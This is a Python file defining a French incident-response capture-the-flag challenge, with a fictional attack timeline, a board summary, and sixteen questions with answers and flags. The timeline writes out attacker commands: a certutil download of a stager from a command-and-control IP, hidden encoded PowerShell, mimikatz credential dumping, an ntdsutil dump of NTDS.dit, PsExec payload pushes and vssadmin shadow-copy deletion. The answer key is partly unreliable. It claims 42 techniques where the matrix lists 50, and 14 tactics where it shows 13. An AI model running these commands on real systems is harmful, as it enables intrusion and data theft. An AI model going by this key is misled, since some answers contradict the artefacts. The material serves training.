"""
Challenge 18 -- L'Examen Final : Reconstruction complete
Niveau : 5 (Threat Hunter)
Categorie : Incident Response
"""

ARTIFACT_FINAL_RECONSTRUCTION = r"""
========== EXAMEN FINAL -- RECONSTRUCTION COMPLETE ==========
========== Operation PHANTOM CRANE : Cloture ==========
Classification : CONFIDENTIEL
Date : 20/02/2026
Redacteur : SOC Manager + CERT RedPawn

===== CHRONOLOGIE COMPLETE DE L'ATTAQUE =====
===== Duree totale : 12 jours (06/02 au 18/02/2026) =====

PHASE 0 -- Preparation (estim. 25/01 -> 05/02/2026)
  25/01 : Enregistrement domaine cdn-static-update.xyz (NameCheap, WhoisGuard)
  28/01 : Enregistrement domaine update-service.xyz (NameCheap, WhoisGuard)
  ~02/2026 : Compilation health_check.exe (timestamp PE: 13/02, probablement antidatee)
  05/02 : Emission certificat Let's Encrypt pour *.update-service.xyz
  06/02 : Premiere resolution DNS update-service.xyz -> 185.234.72.19

JOUR 1 -- 06/02/2026 (Jeudi) : Initial Access
  09:14 : Email phishing recu par j.martin@redpawn-corp.com
          De: notifications-noreply@micros0ft-security.com
          Objet: [URGENT] Facture impayee - Regularisation immediate
          PJ: Facture_Fevrier2026.xlsm (214 KB)
          ProofPoint score: 42/100 (seuil: 65) -> NON BLOQUE
          SPF: SOFTFAIL, DKIM: NONE, DMARC: NONE
  09:17 : j.martin ouvre la piece jointe dans Excel sur WKS-COMPTA-PC03
  09:18 : Macro VBA execute PowerShell encode base64 (-ep bypass -w hidden -e SQBFAFgA...)
          Process parent: EXCEL.EXE (PID 4120)
          CrowdStrike: Alerte "SuspiciousScriptExec" -> mode DETECT-ONLY (non bloque)
  09:20 : certutil -urlcache -split -f http://185.234.72.19/stager.ps1
          Regle Sigma Certutil: DESACTIVEE (FP Java updates)
  09:22 : Stager PS1 telecharge health_check.exe (448 KB, UPX packed)
  09:23 : health_check.exe s'execute, passe 11 checks anti-analyse
  09:24 : Mutex PERS1ST_M0DUL3 cree
  09:25 : Persistance HKCU\...\Run\GoogleChromeAutoUpdate (via powershell.exe)
  09:26 : Injection Early Bird APC dans RuntimeBroker.exe (PID 1284)
  09:27 : Premier beacon HTTPS vers 185.234.72.19:443 (/api/v2/beacon)
          JA3: 72a589da586844d7f0818ce684948eea
          Header custom: X-Ph0n-Agent: 2.4.1
  09:30-09:45 : Reconnaissance locale
          whoami -> redpawn\j.martin
          systeminfo -> Windows 10 Enterprise, domaine redpawn.local
          ipconfig -> 10.0.3.45, DNS 10.0.0.10
          net user /domain -> 342 utilisateurs AD
          net group "Domain Admins" /domain -> admin.rsi, svc-backup, Administrator

JOURS 2-7 -- 07/02 -> 12/02/2026 : Reconnaissance & Mouvement lateral
  07/02 08:00 : Beacon C2 stable (60s + 5% jitter), 1440 beacons/jour
  08/02 14:00 : C2 tasking: LOAD_MODULE mimikatz reflective
                Mimikatz en memoire execute sekurlsa::logonpasswords
                6 credential sets extraits dont svc-backup (NTHash + plaintext)
  09/02 10:00 : Lateral movement tentative via pass-the-hash (svc-backup)
                Acces SMB ADMIN$ sur SRV-DC-01 (10.0.0.10) -> SUCCES
  10/02 : Enregistrement domaine monitoring-check.top (NameCheap)
  10/02 16:00 : Upload de health_check.exe sur SRV-DC-01 (C:\Windows\Temp\)
  11/02 09:00 : Scan reseau interne depuis WKS-COMPTA-PC03
                Decouverte: SRV-FILE-01, SRV-FILE-02, SRV-WEB-01, SRV-BACKUP-01
  12/02 08:05 : Dernier deploiement CI/CD legitime (commit b1e8a9f0 sur staging)

JOUR 8 -- 13/02/2026 : Escalade
  09:00 : Rotation infrastructure C2: update-service.xyz -> 91.215.85.142
  14:00 : wmic /node:"SRV-DC-01" process call create "cmd /c whoami"
          Pas de regle Sigma WMIC remote -> NON DETECTE
  15:00 : Mouvement lateral RDP vers SRV-FILE-01 (10.0.2.20)
          Session RDP anomalie detectee par Darktrace -> Alerte IGNOREE par N1
          (classee "faux positif - admin normal")
  16:00 : Installation webshell logo-update.php sur SRV-WEB-01
          WAF Imperva: 3 tentatives bloquees, 4eme reussie via encodage double URL

JOUR 9 -- 14/02/2026 : Supply Chain + Credential Dump
  01:30 : Compte deploy-bot se connecte a GitHub depuis 185.234.72.19
          PAT sans expiration, permissions admin, User-Agent: python-requests
  03:15 : Commit supply chain b7a3f2c1 sur monitoring-agent (collector.py)
          Force-merge PR #49 sans review (branch protection bypass via admin PAT)
  03:16 : deploy-bot deconnexion (session: 1h46min)
  11:00 : Exploitation SSH brute force: 47 tentatives sur SRV-WEB-01
          Source: WKS-RH-PC01 (10.0.3.60) via tunnel pivote
  14:00 : Premiere resolution DNS monitoring-check.top -> 193.42.33.7
  15:00 : PsExec \\SRV-FILE-01 -u REDPAWN\svc-backup -c health_check.exe
          Sigma PsExec: Alerte levee -> N1 classe "outil admin"

JOUR 10 -- 15/02/2026 : Exfiltration massive + Preparation ransomware
  09:00 : ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds_dump" q q
          47 MB NTDS.dit + 12 MB SYSTEM hive -> 342 comptes AD compromis
          Pas de regle Sigma ntdsutil -> NON DETECTE
  09:30 : csvde -f C:\Temp\ad_export.csv -d "DC=redpawn,DC=local"
          Export complet de l'annuaire Active Directory
  10:00 : Exfiltration via Tor depuis WKS-RH-PC01: 63.4 MB
          Contenu: NTDS dump + export CSV + donnees RH
  12:00 : rundll32 C:\ProgramData\Microsoft\Crypto\ntevt.dll,DllRegisterServer
          DLL Search Order Hijacking -> reverse HTTPS C2
  14:00 : Golden Ticket genere sur SRV-DC-01
          Algorithme: RC4_HMAC_MD5 (au lieu de AES-256 -> indicateur attaque)
          Validite: 10 ans (anormal: tickets normaux = 10h)
  15:00 : GatherNetworkInfo modifie (netcfg.exe -d -> powershell base64)
  16:00 : Debut deploiement ransomware via PsExec sur 5 serveurs
          ransomware.exe (SHA256: e5f6a7b8..., OriginalFilename: crypt0r.exe)
          Utilise bcrypt.dll (crypto Windows native)
  16:05 : vssadmin delete shadows /all /quiet (suppression sauvegardes VSS)
  16:10 : Chiffrement en cours:
          - Fichiers de donnees: 47,832
          - Fichiers de config: 1,247
          - Fichiers de backup: 2,341
          Total: 51,420 fichiers chiffres
          Volume lu: 324 GB (SRUM database)
          Extension: .ph0n
  16:30 : Note de rancon deposee: RECOVERY_INSTRUCTIONS.txt
          Montant: 15 BTC (~$640,000)
          Contact: ph0n-support@protonmail.com
          Site leaks: ph0ncrane7xyzleaks.onion

JOUR 11 -- 16/02/2026 : Detection & Debut reponse
  08:00 : Helpdesk recoit 12 tickets "fichiers illisibles" en 30 minutes
  08:32 : SOC N1 correle les tickets -> alerte SIEM-2026-4401
  09:00 : CERT RedPawn declare l'incident (Severite: CRITIQUE)
  09:30 : Isolation reseau des segments compromis
  10:00 : SRV-DC-01, SRV-FILE-01 deconnectes du reseau
  14:00 : Debut de l'analyse forensique (images disque, memoire, PCAP)

JOURS 12-14 -- 17/02 -> 19/02/2026 : Investigation & Remediation
  17/02 : Analyse memoire Volatility (C13), analyse PCAP (C14)
  18/02 : Analyse cloud AWS (C15), detection insider threat s.moreau (C11)
          Creation service WinDefenderUpdate + taches planifiees sur SRV-DC-01
          Detection Tor upload s.moreau (DLP-017, SIEM-2026-4404)
          Extraction config malware: decouverte C2 tertiaire 193.42.33.7
  19/02 : Rapport TI (C12), threat hunting (C17), regles YARA deployees
  20/02 : Cloture investigation, rapport final (CE DOCUMENT)

===== INCIDENTS PARALLELES IDENTIFIES =====

INCIDENT #1 -- Menace externe (PHANTOM CRANE)
  Type: APT -- attaque ciblee multi-phases
  Duree: 12 jours
  Impact: Ransomware + exfiltration de donnees
  Statut: Contenu et remedie

INCIDENT #2 -- Menace interne (s.moreau)
  Type: Insider threat -- vol de donnees RH
  Duree: 8 jours (10/02 -> 18/02)
  Impact: Exfiltration grilles salariales + contrats
  Statut: En cours d'investigation avec la DRH
  Note: AUCUN lien avec PHANTOM CRANE -- incident independant
        Decouvert pendant l'investigation C11

===== MATRICE MITRE ATT&CK -- CARTOGRAPHIE COMPLETE =====

PHASE                TECHNIQUE                          ID            PREUVES / CHALLENGE REF
Reconnaissance       Gather Victim Identity Info        T1589         Ciblage j.martin (comptabilite)
                     Search Open Websites/Domains       T1593         LinkedIn? (non confirme)
Resource Development Register Infrastructure            T1583.001     update-service.xyz, cdn-static-update.xyz
                     Develop Capabilities               T1587.001     health_check.exe (custom loader)
                     Compromise Infrastructure          T1584         193.42.33.7 (rebond US)
Initial Access       Phishing: Attachment               T1566.001     Facture_Fevrier2026.xlsm (C02)
                     Supply Chain: SW Supply Chain      T1195.001     Commit b7a3f2c1 (non active) (C12)
Execution            Cmd Scripting: PowerShell          T1059.001     Stager PS1 encode (C06)
                     User Execution: Malicious File     T1204.002     Ouverture .xlsm par j.martin
                     Windows Management (WMI)           T1047         wmic /node (C05, C17)
                     System Services: Service Exec      T1569.002     PsExec service execution
Persistence          Boot/Logon Autostart: Run Keys     T1547.001     GoogleChromeAutoUpdate, WinDefUpdate (C09)
                     Create Account: Domain Account     T1136.002     support_it Domain Admin (C17)
                     Scheduled Task/Job                 T1053.005     WinDefUpdate, SystemHealthReport (C09)
                     Windows Service                    T1543.003     WinDefHealthCheck, WinDefenderUpdate (C09)
                     Event Triggered: WMI               T1546.003     WMI Event Subscription (C09)
                     DLL Search Order Hijacking         T1574.001     ntevt.dll dans Crypto (C09)
                     Modify Auth Process                T1556         GatherNetworkInfo modifie (C09)
Privilege Escalation Valid Accounts: Domain             T1078.002     svc-backup credentials
                     Access Token Manipulation          T1134         AdjustTokenPrivileges
Defense Evasion      Process Injection: APC             T1055.004     Early Bird APC Injection (C16)
                     Masquerading: Match Legit Name     T1036.005     health_check.exe = Windows Defender
                     Obfuscated Files: SW Packing       T1027.002     UPX 4.2.2 (C16)
                     Obfuscated Files: Indicator        T1027.005     Base64 encoding, XOR 0x5A
                     Deobfuscate/Decode Files           T1140         base64 dans stager
                     Indicator Removal: File Deletion   T1070.004     Nettoyage partiel C2
                     Reflective Code Loading            T1620         Mimikatz reflective DLL
Credential Access    OS Cred Dumping: LSASS             T1003.001     Mimikatz via injection (C16)
                     OS Cred Dumping: NTDS              T1003.003     ntdsutil IFM dump (C08)
                     OS Cred Dumping: SAM               T1003.002     Lecture SMB fichier SAM
                     Steal Kerberos: Golden Ticket      T1558.001     krbtgt RC4 (C09)
                     Brute Force: Password Spraying     T1110.003     47 tentatives SSH (C01)
Discovery            Account Discovery: Domain          T1087.002     net user /domain, net group
                     Remote System Discovery            T1018         Scan reseau 10.0.0.0/24
                     System Info Discovery              T1082         systeminfo, ipconfig
                     Network Share Discovery            T1135         net share
                     Domain Trust Discovery             T1482         nltest /dclist
Lateral Movement     Remote Services: SMB/Admin         T1021.002     ADMIN$, C$ shares (C05)
                     Remote Services: RDP               T1021.001     Session vers SRV-FILE-01 (C05)
                     Lateral Tool Transfer              T1570         PsExec distribution payloads
                     Exploitation: Web Application      T1190         Webshell logo-update.php (C04)
Collection           Data from Local System             T1005         SAM, NTDS, AD export
                     Data Staged: Local                 T1074.001     C:\Temp\ntds_dump
                     Archive Collected Data             T1560         data_export.7z chiffre
Exfiltration         Exfil Over C2 Channel              T1041         HTTPS beacon (C14)
                     Exfil Over Alt Protocol: DNS       T1048.001     DNS tunneling TXT (C07)
                     Exfil Over Web: Cloud              T1567.002     Tor upload 63.4 MB
                     Transfer Data to Cloud Account     T1537         Usage des credentials
Impact               Data Encrypted for Impact          T1486         Ph0nLock .ph0n (C08)
                     Inhibit System Recovery            T1490         vssadmin delete shadows (C08)

===== BILAN DES INDICATEURS DE COMPROMISSION =====

Categorie          | Total | Confirmes | Faux pos. | Notes
-------------------+-------+-----------+-----------+------------------------------
IP C2              | 5     | 3         | 0         | 185.234.72.19, 91.215.85.142, 193.42.33.7
IP Scanners        | 2     | 0         | 2         | Shodan (71.6.167.142), Censys (167.248.133.56)
Domaines C2        | 3     | 3         | 0         | update-service.xyz, cdn-static-update.xyz, monitoring-check.top
Domaine FP         | 1     | 0         | 1         | legit-telemetry.com (Datadog)
Domaine phishing   | 1     | 1         | 0         | micros0ft-security.com
Hashes malveillants| 4     | 4         | 0         | health_check.exe, stager.ps1, ntevt.dll, crypt0r.exe
Comptes compromis  | 3     | 3         | 0         | j.martin, svc-backup, deploy-bot (GitHub)
Comptes backdoor   | 1     | 1         | 0         | support_it (Domain Admin)
Comptes NON compro | 1     | 0         | 0         | svc-sql (initialement suspecte, ecarte)
TOTAL              | 21    | 15        | 3         | 3 non malveillants identifies

===== SCORE DE SEVERITE FINAL =====
Classification      : APT -- Attaque ciblee multi-phases avec composante supply chain
Groupe              : PHANTOM CRANE (UNC-4892, TA-577b) -- Confiance MODEREE
Duree               : 12 jours (06/02 15:00 -> 18/02 08:32 detection)
Donnees exfiltrees  : ~63.4 MB (Tor) + donnees DNS (volume indetermine)
Fichiers chiffres   : 51,420 sur 5 serveurs
Rancon demandee     : 15 BTC (~$640,000 au cours du 15/02)
Systemes compromis  : 8 (WKS-COMPTA-PC03, SRV-DC-01, SRV-FILE-01, SRV-FILE-02,
                          SRV-WEB-01, SRV-BACKUP-01, WKS-RH-PC01, GitHub deploy-bot)
Comptes AD compromis: 342 (totalite du NTDS.dit)
Regles detection    : 0/14 efficaces (100% d'echec de detection)
Temps avant detection: 10 jours (phishing -> premier helpdesk ticket)
Sophistication      : ELEVEE (custom malware, anti-analyse x11, supply chain, DNS exfil)
RPO (perte donnees) : 29 heures (dernier backup non chiffre: 14/02 11:00)
"""

ARTIFACT_EXECUTIVE_SUMMARY = r"""
========== SYNTHESE EXECUTIF -- POUR LE BOARD ==========
Date : 20/02/2026
Classification : CONFIDENTIEL -- Direction uniquement
Redacteur : RSSI RedPawn

===== RESUME EN 5 POINTS =====

1. QUOI : Attaque informatique de type APT (menace persistante avancee) par le
   groupe PHANTOM CRANE, combinant phishing, vol de donnees, et ransomware.

2. QUAND : Du 6 au 18 fevrier 2026 (12 jours avant detection).

3. COMMENT : Un email piege envoye a un employe de la comptabilite a permis
   l'installation d'un malware custom. L'attaquant a progressivement pris le
   controle du reseau, vole la base de comptes Active Directory, et deploye
   un ransomware sur 5 serveurs.

4. IMPACT :
   - 51,420 fichiers chiffres sur 5 serveurs de production
   - 342 comptes Active Directory compromis (mots de passe a changer)
   - ~63 MB de donnees exfiltrees (AD, donnees RH, configurations)
   - Rancon demandee : 15 BTC (~640,000 EUR) -- NON PAYEE
   - Cout estime total (remediation + perte d'exploitation) : 280,000 - 450,000 EUR
   - Backdoor supply chain identifiee et neutralisee avant activation
   - Incident parallele de menace interne (sans lien avec l'attaque externe)

5. STATUS : Incident contenu et en cours de remediation.
   - Systemes critiques restaures a partir des sauvegardes du 14/02
   - Tous les mots de passe AD reinitialises (y compris KRBTGT x2)
   - Infrastructure C2 bloquee au niveau firewall
   - Regles de detection mises a jour (14 gaps corriges)

===== ANALYSE DES DEFAILLANCES =====

Defaillance                                | Responsabilite   | Impact
-------------------------------------------+------------------+---------------------------
CrowdStrike en mode detect-only            | Decision RSSI    | Initial access non bloque
ProofPoint seuil 65 trop eleve             | Config securite  | Phishing non bloque (score 42)
Regle Sigma Certutil desactivee            | SOC / Detection  | Stager non detecte
N1 ignore les alertes PsExec et RDP        | SOC / Operations | Lateral movement non contenu
Pas de regle ntdsutil/WMIC/RuntimeBroker   | Detection Eng.   | 5 gaps critiques
PAT GitHub sans expiration + admin         | IT / DevOps      | Supply chain possible
Sauvegardes non air-gapped                 | Infrastructure   | RPO de 29 heures
Pas de segmentation reseau adequat         | Architecture     | Mouvement lateral facilite

===== QUESTIONS-REPONSES ANTICIPEES DU BOARD =====

Q: Doit-on payer la rancon ?
R: NON. Recommandation unanime du CERT, RSSI et conseil juridique.
   - Le groupe PHANTOM CRANE a publie les donnees d'une victime MALGRE paiement (SwissPrecision AG)
   - Les sauvegardes du 14/02 permettent une restauration (RPO 29h acceptable)
   - Le paiement financerait de futures attaques et ne garantit rien

Q: Les donnees clients ont-elles ete exfiltrees ?
R: L'analyse est en cours. Les donnees exfiltrees contiennent principalement
   des informations internes (AD, configurations, donnees RH). Une notification
   CNIL sera effectuee par precaution sous 72h (Article 33 RGPD).

Q: Y a-t-il un lien entre l'attaque externe et la menace interne ?
R: NON. L'investigation confirme que l'incident s.moreau (tentative de vol de
   donnees salariales) est completement independant de l'attaque PHANTOM CRANE.
   Les deux incidents se sont superposes par coincidence temporelle.

Q: Combien de temps avant un retour a la normale ?
R: Estimation: 2-3 semaines pour la remediation complete.
   - Semaine 1: Restauration des serveurs + changement de tous les credentials
   - Semaine 2: Deploiement des nouvelles regles de detection + audit securite
   - Semaine 3: Tests de penetration de validation + retour progressif

Q: Quelles mesures pour eviter que ca se reproduise ?
R: Plan d'action en 4 axes (budget estime: 180,000 EUR/an):
   1. Detection: Corriger les 14 gaps Sigma, activer CrowdStrike en mode prevent
   2. Architecture: Segmentation Zero Trust, sauvegardes air-gapped
   3. Humain: Formation anti-phishing trimestrielle, renforcement SOC N1
   4. Gouvernance: Audit annuel par prestataire externe, exercice de crise semestriel
"""

CHALLENGE = {
    "id": "c18_final_exam",
    "title": "L'Examen Final : Operation PHANTOM CRANE",
    "category": "incident_response",
    "level": 5,
    "points_total": 750,
    "estimated_time": "60-90 min",
    "story": """
## Briefing de Mission

**Date :** 20 fevrier 2026, 09h00
**Priorite :** CRITIQUE
**Source :** CISO / Direction

---

L'investigation est terminee. Le CISO demande un rapport final de synthese. Vous avez acces a la reconstitution complete de l'attaque et a la synthese executif preparee pour le board.

> *"C'est l'examen final. Le board se reunit dans 2 heures. Vous devez etre capable de repondre a TOUTE question sur l'incident. La chronologie complete, la matrice ATT&CK, les IoC, les defaillances, les couts. Si vous avez suivi toute l'investigation depuis le Challenge 01, vous avez toutes les reponses. Prouvez-le."*

Ce challenge de synthese teste votre comprehension globale de TOUTE l'investigation. Les questions couvrent l'ensemble des 17 challenges precedents et requierent des croisements entre artefacts.

<details>
<summary>Indice methodologique (cliquez pour afficher)</summary>

C'est l'examen final. Les reponses se trouvent dans la reconstruction ET dans vos souvenirs des challenges precedents. Certaines questions piege testent votre capacite a distinguer les faits confirmes des suppositions. L'analyse des defaillances est aussi importante que la chronologie technique.

</details>
    """,
    "artifacts": [
        {
            "name": "final_reconstruction.txt",
            "type": "report",
            "content": ARTIFACT_FINAL_RECONSTRUCTION,
            "description": "Reconstruction complete -- Operation PHANTOM CRANE (chronologie + ATT&CK + IoC)"
        },
        {
            "name": "executive_summary_board.txt",
            "type": "executive",
            "content": ARTIFACT_EXECUTIVE_SUMMARY,
            "description": "Synthese executif -- Prepare pour le board de direction"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Combien de jours se sont ecoules entre l'acces initial et la detection par le SOC ?",
            "answer": "10",
            "flag": "REDPAWN{10}",
            "points": 40,
            "hints": [
                "Phishing le 06/02, premiers tickets helpdesk le 16/02 a 08:00",
                "Attention: l'incident total dure 12 jours mais la detection arrive au jour 10"
            ],
            "hint_cost": 13
        },
        {
            "id": "q2",
            "text": "Combien de fichiers au total ont ete chiffres par le ransomware Ph0nLock ?",
            "answer": "51420",
            "flag": "REDPAWN{51420}",
            "points": 30,
            "hints": [
                "Additionnez les 3 categories de fichiers dans la chronologie du Jour 10",
                "47832 + 1247 + 2341"
            ],
            "hint_cost": 10
        },
        {
            "id": "q3",
            "text": "Combien de techniques MITRE ATT&CK distinctes (IDs Txxxx.xxx) sont cartographiees dans la matrice finale ?",
            "answer": "42",
            "flag": "REDPAWN{42}",
            "points": 60,
            "hints": [
                "Comptez chaque ligne avec un ID T1xxx dans la matrice complete",
                "Chaque sous-technique (.001, .002) compte separement"
            ],
            "hint_cost": 20
        },
        {
            "id": "q4",
            "text": "Quel est le cout estime TOTAL de la remediation pour le board (fourchette haute en EUR) ?",
            "answer": "450000",
            "flag": "REDPAWN{450000}",
            "points": 40,
            "hints": [
                "Regardez la section IMPACT de la synthese executif",
                "C'est la fourchette haute du cout estime"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Pourquoi le CERT recommande-t-il de NE PAS payer la rancon ? Quel cas concret le justifie ? (nom de la victime)",
            "answer": "SwissPrecision AG",
            "flag": "REDPAWN{SwissPrecision_AG}",
            "points": 50,
            "hints": [
                "Regardez la Q&A du board dans la synthese executif",
                "Une victime a paye mais ses donnees ont quand meme ete publiees"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Combien de phases ATT&CK distinctes (categories principales, pas les sous-techniques) couvre cette attaque ?",
            "answer": "14",
            "flag": "REDPAWN{14}",
            "points": 50,
            "hints": [
                "Comptez les titres en majuscules dans la matrice ATT&CK",
                "Reconnaissance, Resource Dev, Initial Access, Execution, Persistence, Priv Esc, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, Exfiltration, Impact + Exploitation (in Lateral)"
            ],
            "hint_cost": 17
        },
        {
            "id": "q7",
            "text": "L'incident s.moreau (menace interne) est-il lie a l'attaque PHANTOM CRANE ? (oui/non)",
            "answer": "non",
            "flag": "REDPAWN{non}",
            "points": 40,
            "hints": [
                "Regardez la section Incidents paralleles et la Q&A du board",
                "Les deux incidents sont independants malgre la coincidence temporelle"
            ],
            "hint_cost": 13
        },
        {
            "id": "q8",
            "text": "Combien de defaillances sont identifiees dans l'analyse des defaillances de la synthese executif ?",
            "answer": "8",
            "flag": "REDPAWN{8}",
            "points": 40,
            "hints": [
                "Comptez les lignes dans le tableau des defaillances",
                "CrowdStrike, ProofPoint, Certutil, N1, 5 gaps, PAT, backups, segmentation"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Combien d'IoC au total sont confirmes comme malveillants dans le bilan des IoC ?",
            "answer": "15",
            "flag": "REDPAWN{15}",
            "points": 40,
            "hints": [
                "Regardez le tableau de bilan des IoC",
                "Colonne 'Confirmes' -> total"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Quel est le RPO (Recovery Point Objective) reel de l'incident en heures ?",
            "answer": "29",
            "flag": "REDPAWN{29}",
            "points": 50,
            "hints": [
                "Regardez le score de severite final",
                "Le dernier backup non chiffre date du 14/02 a 11:00"
            ],
            "hint_cost": 17
        },
        {
            "id": "q11",
            "text": "Quel article du RGPD impose la notification CNIL sous 72h ?",
            "answer": "33",
            "flag": "REDPAWN{33}",
            "points": 40,
            "hints": [
                "Regardez la Q&A du board sur l'exfiltration de donnees",
                "C'est mentionne explicitement dans la reponse"
            ],
            "hint_cost": 13
        },
        {
            "id": "q12",
            "text": "Combien de systemes sont identifies comme compromis dans le score de severite final ?",
            "answer": "8",
            "flag": "REDPAWN{8}",
            "points": 30,
            "hints": [
                "Comptez les systemes listes apres 'Systemes compromis :'",
                "7 machines + 1 compte GitHub"
            ],
            "hint_cost": 10
        },
        {
            "id": "q13",
            "text": "Le vecteur supply chain (commit b7a3f2c1) a-t-il cause des dommages reels chez RedPawn ? (oui/non)",
            "answer": "non",
            "flag": "REDPAWN{non}",
            "points": 40,
            "hints": [
                "Verifiez dans la chronologie et la synthese executif",
                "Le commit n'a jamais ete deploye (dernier deploiement: b1e8a9f0 le 12/02)"
            ],
            "hint_cost": 13
        },
        {
            "id": "q14",
            "text": "Quel est le budget annuel estime pour le plan d'action de prevention recommande au board ? (en EUR)",
            "answer": "180000",
            "flag": "REDPAWN{180000}",
            "points": 40,
            "hints": [
                "Regardez la derniere Q&A du board",
                "Le plan est en 4 axes avec un budget annuel estime"
            ],
            "hint_cost": 13
        },
        {
            "id": "q15",
            "text": "Quel pourcentage des regles de detection du SIEM etait efficace pendant l'attaque ?",
            "answer": "0",
            "flag": "REDPAWN{0}",
            "points": 50,
            "hints": [
                "Regardez le score de severite: Regles detection",
                "0/14 efficaces = 100% d'echec"
            ],
            "hint_cost": 17
        },
        {
            "id": "q16",
            "text": "Combien de faux positifs ont ete identifies dans le bilan total des IoC ?",
            "answer": "3",
            "flag": "REDPAWN{3}",
            "points": 40,
            "hints": [
                "Regardez la colonne 'Faux pos.' dans le tableau des IoC",
                "2 scanners (Shodan/Censys) + 1 domaine (legit-telemetry.com)"
            ],
            "hint_cost": 13
        }
    ]
}
